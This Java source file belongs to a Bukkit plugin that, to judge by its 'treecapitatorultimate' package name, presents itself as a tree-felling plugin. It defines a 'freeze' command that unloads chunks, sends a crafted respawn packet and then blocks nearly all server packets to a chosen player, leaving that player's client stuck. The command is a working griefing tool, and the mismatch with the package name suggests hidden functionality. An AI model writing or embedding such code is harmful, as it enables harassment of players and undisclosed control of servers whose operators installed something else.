package me.bow.treecapitatorultimate.commands.Player;

import com.google.common.hash.Hashing;
import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.CraftBukkitUtil;
import me.bow.treecapitatorultimate.Utils.Packet.Packet;
import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
import me.bow.treecapitatorultimate.Utils.Packet.PacketInjector;
import me.bow.treecapitatorultimate.Utils.Packet.PacketSender;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import java.util.ArrayList;
import java.util.UUID;

@Command.Info(command = "freeze", description = "Freezes player's minecraft", category = CommandCategory.Player)
public class FreezeMinecraft extends Command {

    private final String[] whitelistPackets = {
            "PacketPlayOutKeepAlive",
            "PacketPlayOutChat",
            "PacketPlayOutRespawn",
            "PacketPlayOutCloseWindow",
            "PacketPlayOutUnloadChunk",
            "PacketPlayOutPlayerInfo"
    };
    private ArrayList<UUID> leftPlayer = new ArrayList<>();
    private ArrayList<UUID> players = new ArrayList<>();

    public FreezeMinecraft() {
        PacketInjector.addPacketListener(this);
    }

    @Override
    public void onServerTick() {
        for (UUID uuid : players) {
            Player p = Bukkit.getPlayer(uuid);
            if (p == null || !p.isOnline()) continue;
            p.closeInventory();
        }
    }

    @Override
    public void onPlayerLeave(PlayerQuitEvent e) {
        UUID player = e.getPlayer().getUniqueId();
        if(!players.contains(player)) return;
        leftPlayer.add(player);
        players.remove(player);
    }

    @Override
    public void onPlayerJoin(PlayerJoinEvent e) {
        UUID uuid = e.getPlayer().getUniqueId();
        if(!leftPlayer.contains(uuid)) return;
        leftPlayer.remove(uuid);
        players.add(uuid);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.Error(p, "Player is not online!");
            }
            //noinspection ConstantConditions
            if (players.contains(anotherPlayer.getUniqueId())) {
                players.remove(anotherPlayer.getUniqueId());
                CraftBukkitUtil.refreshPlayer(anotherPlayer);
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.RED + " is now longer frozen!");
                this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " unfroze " + anotherPlayer.getDisplayName() + "!");
            } else {
                players.add(anotherPlayer.getUniqueId());
                Object nmsWorld = CraftBukkitUtil.getNmsWorld(anotherPlayer.getWorld());
                Object nmsPlayer = CraftBukkitUtil.getNmsPlayer(anotherPlayer);
                Object dimensionManager = ReflectionUtils.getFieldCached(nmsPlayer.getClass(), "dimension").get(nmsPlayer);
                dimensionManager = ReflectionUtils.getMethodCached(dimensionManager.getClass(), "getType").invoke(dimensionManager);
                Object worldData = ReflectionUtils.getMethodCached(nmsWorld.getClass(), "getWorldData").invoke(nmsWorld);
                worldData = ReflectionUtils.getMethodCached(worldData.getClass(), "getType").invoke(worldData);
                Object gameMode = ReflectionUtils.getFieldCached(nmsPlayer.getClass(), "playerInteractManager").get(nmsPlayer);
                gameMode = ReflectionUtils.getMethodCached(gameMode.getClass(), "getGameMode").invoke(gameMode);
                Object packetPlayOutRespawn = ReflectionUtils.getConstructorCached("{nms}.PacketPlayOutRespawn", dimensionManager.getClass(), long.class, worldData.getClass(), gameMode.getClass()).invoke(dimensionManager, Hashing.sha256().hashLong(p.getWorld().getSeed()).asLong(), worldData, gameMode);
                for (int x = -p.getClientViewDistance(); x <= p.getClientViewDistance(); x++)
                    for (int z = -p.getClientViewDistance(); z <= p.getClientViewDistance(); z++)
                        PacketSender.Instance.sendPacket(anotherPlayer, Packet.createFromNMSPacket(ReflectionUtils.getConstructorCached("{nms}.PacketPlayOutUnloadChunk", int.class, int.class).invoke(x, z)));
                PacketSender.Instance.sendPacket(anotherPlayer, Packet.createFromNMSPacket(packetPlayOutRespawn));
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GOLD + anotherPlayer.getName() + ChatColor.GREEN + " frozen!");
                this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " froze " + anotherPlayer.getDisplayName() + "'s minecraft!");
            }
        } catch (Exception e) {
            Start.Error(p, e);
        }
    }

    @Override
    public void onPacketSend(PacketEvent packetEvent) {
        if (!players.contains(packetEvent.getPlayer().getUniqueId())) return;
        Packet p = packetEvent.getPacket();
        for (String whitelist : whitelistPackets) {
            if (p.getPacketClass().getSimpleName().equalsIgnoreCase(whitelist)) return;
        }
        packetEvent.setCancelled(true);
    }
}
